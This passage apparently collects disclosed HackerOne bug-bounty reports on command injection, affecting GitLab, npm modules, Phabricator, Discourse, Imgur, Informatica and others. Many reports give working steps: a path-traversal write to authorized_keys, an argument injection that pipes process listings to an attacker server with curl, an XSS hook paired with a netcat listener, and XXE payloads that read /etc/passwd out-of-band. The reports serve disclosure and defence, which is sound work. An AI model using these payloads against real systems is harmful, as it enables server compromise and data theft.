command="ls -lash",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==
------WebKitFormBoundaryA0TxBpQRLhL4lJQN--
```

In the request, replace my public SSH key with your own and replace `ls -lash` with whatever command you want to execute. When the request is sent to the server, a 302 Found will be returned. This is caused by a validation error that is returned because the project name contains invalid characters. Because the files aren't cleaned up, our exploit persists.

**Response**
```
HTTP/1.1 302 Found
Server: nginx
...
Location: http:/gitlab-instance/import/gitlab_project/new?namespace_id=1&path=new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
...
```

Now, to execute the command, run `ssh git@gitlab-instance`:

```
$ ssh git@gitlab-instance
PTY allocation request failed on channel 0
total 84K
4.0K drwxr-xr-x 18 root              root       4.0K Dec 15 04:33 .
4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:32 ..
4.0K drwx------  2 git               root       4.0K Dec 15 04:32 backups
4.0K -rw-------  1 root              root         38 Dec 15 04:33 bootstrapped
4.0K drwx------  2 git               root       4.0K Dec 17 02:28 gitaly
4.0K -rw-r--r--  1 git               git         292 Dec 15 04:32 .gitconfig
4.0K drwx------  3 git               root       4.0K Dec 15 04:32 git-data
4.0K drwxr-xr-x  3 git               root       4.0K Dec 15 04:32 gitlab-ci
4.0K drwxr-xr-x  2 git               root       4.0K Dec 15 04:33 gitlab-monitor
4.0K drwxr-xr-x  9 git               root       4.0K Dec 15 04:33 gitlab-rails
4.0K drwx------  2 git               root       4.0K Dec 15 04:32 gitlab-shell
4.0K drwxr-x---  2 git               gitlab-www 4.0K Dec 17 02:28 gitlab-workhorse
4.0K drwx------  3 root              root       4.0K Dec 17 02:38 logrotate
4.0K drwxr-x---  9 root              gitlab-www 4.0K Dec 17 02:28 nginx
4.0K drwxr-xr-x  3 root              root       4.0K Dec 15 04:33 node-exporter
4.0K drwx------  2 gitlab-psql       root       4.0K Dec 15 04:34 postgres-exporter
4.0K drwxr-xr-x  3 gitlab-psql       root       4.0K Dec 17 02:28 postgresql
4.0K drwxr-x---  3 gitlab-prometheus root       4.0K Dec 15 04:33 prometheus
4.0K drwxr-x---  2 gitlab-redis      git        4.0K Dec 17 02:43 redis
4.0K drwx------  2 git               git        4.0K Dec 17 02:44 .ssh
4.0K -rw-r--r--  1 root              root         40 Dec 15 04:32 trusted-certs-directory-hash
```

This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).

## Impact

An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.

---

### [RCE By import channel field](https://hackerone.com/reports/335761)

- **Report ID:** `335761`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** ExpressionEngine
- **Reporter:** @khalooda0x
- **Bounty:** - usd
- **Disclosed:** 2018-04-20T15:17:39.270Z
- **CVE(s):** -

**Summary (team):**

The reporter determined that a malicious Channel Set could be used to allow an administrator to upload a PHP file that they might otherwise not have permission to upload. Combined with the temporary folder name algorithm being available in the source code, the malicious administrator could potentially guess its location, and if the site were running with a web-accessible system folder, could allow them to run arbitrary code.

The issue was resolved to prevent potential discovery of the temporary folder, and decreased the TTL of that folder to further prevent from any brute-force guessing of the folder name.

It should be noted that post-installation best-practices is to [move the system folder above web-root](https://docs.expressionengine.com/latest/installation/best_practices.html), which by itself would make such an attack impossible even for a CMS administrator.

**Summary (researcher):**

i found RCE Because they just blocked .php at upload function so i bypassed it ^_^

---

### [[pdfinfojs] Command Injection on filename parameter](https://hackerone.com/reports/330957)

- **Report ID:** `330957`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @caioluders
- **Bounty:** - usd
- **Disclosed:** 2018-04-19T07:31:54.253Z
- **CVE(s):** CVE-2018-3746

**Vulnerability Information:**

Hello , there is a Command Injection vulnerability on the "pdfinfojs" module.

# Module

**module name:** pdfinfojs
**version:** 0.3.6
**npm page:** https://www.npmjs.com/package/pdfinfojs

## Module Description

> pdfinfo shell wrapper for Node.js

## Module Stats

10 downloads in the last day
61 downloads in the last week
106 downloads in the last month

# Vulnerability

## Vulnerability Description

> The module appends the filename parameter to the command on the lines [28](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L28), [47](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L47) and [72](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L72) without parsing the user input, thus leading to a Command Injection. 

## Steps To Reproduce:

* Install the module 

```
$ npm install pdfinfojs
```

* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*

* Run the code 

```
$ node index.js
Error
    ... it throws an error, but the execution is successful
```
* Check the newly created file 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `pdfinfo` command.

## Tested on :

- macOS Sierra 10.12.16
- NODEJS v8.4.0
- NPM 5.3.0

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker can execute arbitrary commands on the victim's machine

---

### [`whereis` concatenates unsanitized input into exec() command](https://hackerone.com/reports/319476)

- **Report ID:** `319476`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-03-28T06:17:58.607Z
- **CVE(s):** CVE-2018-3772

**Vulnerability Information:**

I would like to report command injection in `whereis`
It allows to inject arbitrary shell commands by trying to locate crafted filenames.

# Module

**module name:** whereis
**version:** 0.4.0
**npm page:** `https://www.npmjs.com/package/whereis`

## Module Description

> Simply get the first path to a bin on any system.

## Module Stats

Stats
101 downloads in the last day
5 403 downloads in the last week
18 945 downloads in the last month

~227 340 estimated downloads per year [JUST FOR REFERENCE,  ~DOWNLOADS PER MONTH*12]

# Vulnerability

## Vulnerability Description

File name argument is not properly escaped before being concatenated into the command that is passed to `exec()`.

See lines https://github.com/vvo/node-whereis/blob/master/index.js#L4-L12

## Steps To Reproduce:

```js
var whereis = require('whereis');
var filename = 'wget; touch /tmp/tada';
whereis(filename, function(err, path) {
  console.log(path);
});
```

Observe file `/tmp/tada` created.

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0
- bash 4.4.012

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

For setups where unsanitized user input could end up in `whereis` argument, users would be able to execute arbitrary shell commands.

---

### [Admin Panel Accessed (OAuth Bypassed ) ](https://hackerone.com/reports/294911)

- **Report ID:** `294911`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Mapbox
- **Reporter:** @anees_khan
- **Bounty:** 4000 usd
- **Disclosed:** 2017-12-21T21:10:09.434Z
- **CVE(s):** -

**Summary (team):**

On December 4, 2017, @aneeskhan reported an authentication bypass vulnerability on a Mapbox internal portal. The vulnerability allowed them to bypass OAuth authentication and generate a valid session for the site. This session was then used by @aneeskhan to access information on the portal which required authentication. Using the details provided by @aneeskhan, Mapbox fixed the session handling code within its portal software preventing failed OAuth authentication attempts from generating valid sessions.

---

### [Command injection in the process of downloading the latest version of the cloud key firmware through the unifi management software.](https://hackerone.com/reports/183458)

- **Report ID:** `183458`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @dblack
- **Bounty:** - usd
- **Disclosed:** 2017-12-11T11:58:31.128Z
- **CVE(s):** -

**Summary (team):**

In UniFi Cloud Key versions prior to `5.3.12`, `5.4.9` and `5.5.2`, the firmware is downloaded in a unprotected channel, with allow an attacker in an MitM scenario to interfere with the communication, and possibly modifying the firmware during an update. The versions `5.3.12`, `5.4.9` and `5.5.2` fix this problem by utilizing encrypted channel to download the firmware.

---

### [Remote Code Execution at http://tw.corp.ubnt.com](https://hackerone.com/reports/269066)

- **Report ID:** `269066`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @hassham
- **Bounty:** - usd
- **Disclosed:** 2017-11-29T15:01:21.259Z
- **CVE(s):** -

**Summary (team):**

The researcher found a Command Injection in tw.corp.ubnt.com.

**Summary (researcher):**

While hunting i came across a host of Ubiquiti Networks tw.corp.ubnt.com , when i browsed to http://tw.corp.ubnt.com there was Dir listing enabled which contained various sensitive information. This was reported to Ubiquiti Team. 

However I decided to look further in the Directories and files which were being leaked, and came across an endpoint /tools/ntpasswd.php . This endpoint had functionality of allowing users for converting clear text passwords into NT and LM hashes. 

After simple fuzzing it was discovered that the end point is vulnerable to Command Injection bug and was reported to Ubiquiti team. 

PS: One of the simplest bug found.

---

### [Command injection on Phabricator instance with an evil hg branch name](https://hackerone.com/reports/288704)

- **Report ID:** `288704`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Phabricator
- **Reporter:** @criticalonly
- **Bounty:** - usd
- **Disclosed:** 2017-11-11T00:42:44.118Z
- **CVE(s):** -

**Vulnerability Information:**

Hi phabricator,

I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.

Here is the reproduction steps:
1. Monitor a remote mercurial repo with phabricator;
2. Create a branch and called "--config=hooks.pre-log=wget" on the remote;
3. After phabricator update the remote repo,visit the history page of that crafted branch;
```
http://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/
```
4. It will raise an error like below and the wget command will be executed;
5. I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).

```
Command failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-
connect' log --debug --template '{node};{parents}\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev 
'reverse(ancestors('\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\''))' STDOUT running hook pre-log: 
wget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file 
/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... 
[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1
```
The root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.
Thanks!

---

### [HTML injection in email in unikrn.com](https://hackerone.com/reports/262004)

- **Report ID:** `262004`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Unikrn
- **Reporter:** @codebrained
- **Bounty:** - usd
- **Disclosed:** 2017-08-23T08:21:40.908Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! **Please add the affected domain name in the Title of the report.**

**Summary:** Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.

**Description:** Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.

The user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the "raffle_winner_sidebar_body" text and is done so without any sanitization. 

Therefore should a user set their first name as '<script src=\"https://external.com/xss.js\" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.

Alongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. 

An example payload may be 
<a href=\"https://attacker/phish.php\"><img src=\"https://attacker/content.jpg\"></a><script>


Remedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.

## Steps To Reproduce:
## XSS:
  1. Use the provided curl command to set a users first name to an xss payload such as <script src=\"https://external2.com/xss.js\" />
  2. Win a raffle
  3. Visit the raffles page once you have been announced as a winner.
## Email HTML Injection:
 1. Use the provided curl command to set a users first name to a payload such as <a href=\"https://attacker/phish.php\"><img src=\"https://attacker/content.jpg\"></a><script>
2. Navigate to the profile page and send a referral email.

## Supporting Material/References:

XSS
* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\"country\":\"GB\",\"firstname\":\"<script src=\\\"https://external2.com/xss.js\\\" />\", \"session_id\":\"SESSION_ID\"}'  $'https://unikrn.com/apiv2/user/verify'

Email HTML Injection
* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\"country\":\"GB\",\"firstname\":\"<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\", \"session_id\":\"SESSION_ID\"}'  $'https://unikrn.com/apiv2/user/verify'

---

### [Command Execution because of extension handling](https://hackerone.com/reports/188078)

- **Report ID:** `188078`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Brave Software
- **Reporter:** @paulos__
- **Bounty:** - usd
- **Disclosed:** 2017-08-10T05:10:31.716Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Hello,

Using this bug an attacker can execute commands as the current user using brave & gain complete shell capabilities (and all possibilities associated) 

## Details:

The issue is in the way the application handles website TLDs. typically in windows, `.com` represents an application, much similar like `.exe` - when Brave saves a website (Ctrl+S) - it uses the name of the website.

For PoC purpose I used `.bat` TLDs because they are much easier to show a poc with instead of binary application garbage data. 

So Assume a user visits http://paulos.bat with the contents of:
```js
@echo off
calc
```

And saves the page, this will save the website as `paulos.bat` - which when executed - actually opens batch and executes calculator.

## Bypassing Mitigations

In Windows, Microsoft warns users when they execute applications that are downloaded, this can simply be bypassed by sending filenames with words like `Update` or `Setup`... yeah, I can't believe this works too.

So say a user visits `https://malicioussetup.com` and saves the site - note this site changed its contents from whatever it was to binary-garbage & microsoft will allow executing it - eventually causing code execution.

This is clearly a chain of low priority issues that cause command execution. :) (POC 

## Products affected: 

 * Tested in Latest Brave Windows (I suspect OSX, iOS & Android may also be affected)

## Recommended Fix:

 Add .html/htm to the index page (/index.html) to mitigate this easily

## Supporting Material/References:

  * POC image attached
  * POC video (Private): https://youtu.be/ret4pJArYSU

I think you should fix this ASAP! as anyone can register `.com` sites to abuse it.

Thanks,
Paulos

---

### [Admin Command Injection via username in user_archive ExportCsvFile](https://hackerone.com/reports/214022)

- **Report ID:** `214022`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Discourse
- **Reporter:** @ziot
- **Bounty:** 512 usd
- **Disclosed:** 2017-05-13T21:25:53.259Z
- **CVE(s):** -

**Vulnerability Information:**

When a user generates a backup of their posts, their username gets sent to the `ExportCsvFile` job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.

## Steps

 1. Login as an admin on try.discourse.org, e.g.
  * http://try.discourse.org/
 2. Make a backup of the website and download it.
 3. Extract the contents of the archive.
 4. Modify one of the usernames of an account you have access to:
  * test.txt;wget mrzioto.com
 5. Repackage the archive.
 6. Upload the modified archive.
 7. Restore from backup.
 8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).
 9. Send the POST request for creating a user export archive:
  * http://34.205.246.2/export_csv/export_entity.json
  * POST: entity_type=user&entity=user_archive
 10. ---> You forced the server to make a wget leading to RCE/command injection.

## Code Flow

```
      file_name_prefix = if @entity == "user_archive"
        "#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime("%y%m%d-%H%M%S")}"

      file_name = "#{file_name_prefix}-#{file.id}.csv"
      absolute_path = "#{UserExport.base_directory}/#{file_name}"

      `gzip -5 #{absolute_path}`
```

---

### [RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`](https://hackerone.com/reports/212696)

- **Report ID:** `212696`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Imgur
- **Reporter:** @neex
- **Bounty:** - usd
- **Disclosed:** 2017-04-26T21:30:28.855Z
- **CVE(s):** CVE-2016-10033

**Vulnerability Information:**

### Summary

The `y` parameter of `/edit/process` endpoint (with `a=crop`) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably `gm convert`). Due to GraphicsMagick's hacker-friendly processing of `|`-starting filenames supplied to `-write` option, it leads to command execution.

### Reproduction steps

0. Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.
1. Login into your imgur account and upload an image.
2. Move your mouse over the image, click on the tiny button with pencil on it, then click "Edit".
3. Select a random rectangle on the image, then click "Apply".
4. In the burp suite, you will see a request to an URL like this:  `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510`

     Change the `y` parameter of the request so it becomes `0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-`. 

     The full URL after the change must look like `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303`, note that you have to change `<your-server>` to a webserver under your control).

5. Fire a request to the modified URL. The command (`ps aux|curl http://<your-server> -d @-`) will be executed somewhere inside imgur, and you will get a HTTP request to `<your-server>` with the result of `ps aux` in the POST body.  You can replace `ps aux` with another command (but you have to write `${IFS}` instead of spaces).

### Detailed description

I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of `y` GET parameter) goes into a shell command. While all special characters (like `|`, `$` and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is `escapeshellcmd` PHP function, but that can also be some kind of custom input filtering/processing.

The rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by "Crop/Resize" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended ` -rotate 90` to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably `gm convert` utility). I read the documentation and found that `-write` argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.

### Mitigation

Probably either some kind of custom processing or `escapeshellcmd` function is used to construct the command line. In both cases, replace it with applying `escapeshellarg` to individual arguments. In the second case, you probably want to run `grep -R escapeshellcmd <path to the source code>` to find more vulns :-)

---

### [[careers.informatica.com] Reflected Cross Site Scripting to XSS Shell Possible](https://hackerone.com/reports/147196)

- **Report ID:** `147196`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Informatica
- **Reporter:** @zephrfish
- **Bounty:** - usd
- **Disclosed:** 2016-12-31T00:20:57.583Z
- **CVE(s):** -

**Vulnerability Information:**

#####Description
Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.


#####Issue
The consultant identified that the careers page is vulnerable to reflected cross site scripting, this means that a malicious user can craft a link to compromise a user, the user simple needs to click on the link and the payload is launched. 

----------
#####Affected URLs
    https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E

From the affected URL it can be seen that the `isJTN` parameter can be given any javascript code or HTML tags and it will execute the code within. The above payload simply launches a prompt box with the consultant's hackerone username ZephrFish. However cross site scripting can be further weaponised to hook a victim's browser and cause further damage. See the proof of concept section below for a full weaponised scenario using this reflected cross site scripting to execute client side code execution.

####Risk: **High**
This issue has been marked as high due to  the risk of compromise being on the user rather than server side, however this should still be considered as an issue and dealt with accordingly, if an attacker is able to compromise a victim's browser they can do far worse than pop an alert message. This is essentially a new form of reflected cross site scripting which is persistent to the user's browser being open.

#####Remediaton
Implement http authentication on the affected directories, or alternatively  remove the examples folder entirely to prevent the attack surface.  Consider following a lockdown procedure against the installation and updating Tomcat to a newer instance. 

#####Weaponising Cross Site Scripting
The following example demonstrates how an attacker can establish a persistent connection to a victim's browser and proceed to execute arbitrary commands on the victim's machine.

**The hook**
The victim receives a malicious link, similar to that shown below:

    https://careers.informatica.com/apply?isJTN=<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//AttackerServerIP:ANYPORT";d.body.appendChild(z)},0)</script>

Attacker Server:
The attacker runs the following code to catch the shell with netcat:

    while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; done

When this link is clicked on the attacker's server will catch a shell and allow the attacker to execute arbitrary commands on the victim's browser as shown in the attached screenshots, these commands can be any javascript commands including theft of cookies, redirection of victim's browser or in some cases malware delivery.

The following shows what is shown on the attacker's server when a valid connection attempt is received:

    [root@inform]# while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 533 >/dev/null; done
    ZephrFishHackerOne>$ alert('Shell')
    listening on [any] 533 ...
    connect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIM BROWSERIP] 55730
     sent 15, rcvd 245


#####References

 - [OWASP: Cross Site Scripting Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)

#####Request & Response
GET Request

    GET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1
    Host: careers.informatica.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Cookie: AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16977%7CMCMID%7C43066833403543674402896414893465241440%7CMCAID%7CNONE%7CMCAAMLH-1467332027%7C6%7CMCAAMB-1467332028%7CNRX38WO0n5BH8Th-nqAG_A; mbox=PC#1466727226198-680058.26_3#1468009316|check#true#1466799776|session#1466799715648-663873#1466801576; s_nr=1466799716120-Repeat; s_vnum=1469319227675%26vn%3D3; mktrest_end_time=1466727232954; mktrest_cookie=anonymous; wooTracker=pFDG1ZqP3HWn; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1466727758906-39922; mrkto_lead="{\"requestId\":\"11ba9#1557fcb4463\",\"result\":[],\"success\":true,\"marketoCall\":\"false\"}"; do_mkto_call=false; _ga=GA1.2.935149421.1466727762
    Connection: close
    

   
Response

    HTTP/1.1 200 OK
    Content-Language: en-US
    Content-Type: text/html;charset=utf-8
    Date: Sat, 25 Jun 2016 14:14:16 GMT
    Server: Apache-Coyote/1.1
    Strict-Transport-Security: max-age=63072000; includeSubdomains; preload
    Vary: Accept-Encoding
    Connection: Close
    Content-Length: 53097
    ---snip---
                var payload = {fileUrl: link, jobSeqNo: jobId, refNum: refNum, isQuickApply: isQuickApply,
                                actualJobId: actualJobId, title: title, location: location,
                                applySource: applySource, applyUrl: applyUrl, category: category, isJTN: "<script>prompt('ZephrFish')</script>",
                                atsApplyDataId:atsApplyDataId,atsApplyStatusId:atsApplyStatusId, applyType: applyType,
                                screenWidth: screen.width, screenHeight: screen.height}
               sendDownloadResume(payload) 
    ---snip---

---

### [Unrestricted File Upload](https://hackerone.com/reports/184596)

- **Report ID:** `184596`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hogarth45
- **Bounty:** - usd
- **Disclosed:** 2016-12-22T22:42:01.258Z
- **CVE(s):** -

**Summary (team):**

A Navy system had a file upload tool accessible from the Internet. This would have permitted an attacker to upload malicious files and potentially execute code on the server. Thanks to @hogarth45 for reporting it.

---

### [[marketplace.informatica.com] - XXE](https://hackerone.com/reports/106797)

- **Report ID:** `106797`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Informatica
- **Reporter:** @yarbabin
- **Bounty:** - usd
- **Disclosed:** 2016-12-09T08:06:26.920Z
- **CVE(s):** -

**Vulnerability Information:**

Request:
`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 140`
`Accept: */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Content-Type: application/json`
`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`

`{"params":{"source":"marketplace","rows":5,"offset":0,"queryParams":{"query":"lol","fieldList":"[\"id\", \"title\"]","sortBy":"relevance"}}}`

But, if we change content-type to application/xml and convert JSON to XML:
`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 350`
`Accept: */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
`Content-Type: application/xml;charset=UTF-8`

`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
`<!DOCTYPE foo [  `
`<!ELEMENT foo ANY >`
`<!ENTITY xxe SYSTEM "file:///etc/passwd1" >]>`
`<params>`
`<offset>0</offset>`
`<queryParams>`
`<query>&xxe;</query>`
`<sortBy>relevance</sortBy>`
`<fieldList>["id", "title"]</fieldList>`
`</queryParams>`
`<source>marketplace</source>`
`<rows>5</rows>`
`</params>`

I get response: `JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory). `

Then, i try to get /etc/passwd with OOB vector:
`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`
`Host: marketplace.informatica.com`
`Connection: keep-alive`
`Content-Length: 350`
`Accept: */*`
`X-J-Token: no-user`
`X-Requested-With: XMLHttpRequest`
`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`
`Origin: https://marketplace.informatica.com`
`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`
`Accept-Encoding: gzip, deflate`
`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`
`Content-Type: application/xml;charset=UTF-8`

`<?xml version="1.0" encoding="UTF-8" standalone="no"?>`
`<!DOCTYPE foo [  `
`<!ENTITY % b SYSTEM "file:///etc/passwd">`
`<!ENTITY % asd SYSTEM "http://evilhost/xx.html">  %asd;  %rrr;]>`
`<params>`
`<offset>0</offset>`
`<queryParams>`
`<query>&xxe;</query>`
`<sortBy>relevance</sortBy>`
`<fieldList>["id", "title"]</fieldList>`
`</queryParams>`
`<source>marketplace</source>`
`<rows>5</rows>`
`</params>`

And I got it :)

---

### [[rev-app.informatica.com] - XXE via SAML](https://hackerone.com/reports/106865)

- **Report ID:** `106865`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Informatica
- **Reporter:** @yarbabin
- **Bounty:** - usd
- **Disclosed:** 2016-12-09T08:05:31.036Z
- **CVE(s):** -

**Vulnerability Information:**

Request:
`POST /sso HTTP/1.1`
`Host: rev-app.informatica.com`
`Connection: keep-alive`
`Content-Length: 8669`
`Cache-Control: max-age=0`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`
`Origin: https://infapassport.okta.com`
`Upgrade-Insecure-Requests: 1`
